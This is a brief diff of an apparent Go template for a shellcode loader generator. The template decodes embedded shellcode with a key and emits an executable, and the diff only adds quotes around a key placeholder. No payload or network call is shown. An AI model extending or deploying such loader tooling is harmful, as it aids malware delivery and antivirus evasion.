@@ -71,7 +71,7 @@ func $gd() int {
 
 func main() {
 	$bbdata := "$bdata"
-	$keyName = []byte($keys)
+	$keyName = []byte("$keys")
 	$shellCodeHex := $getDeCode($bbdata)
 	$gd()
 	$genEXE($shellCodeHex)
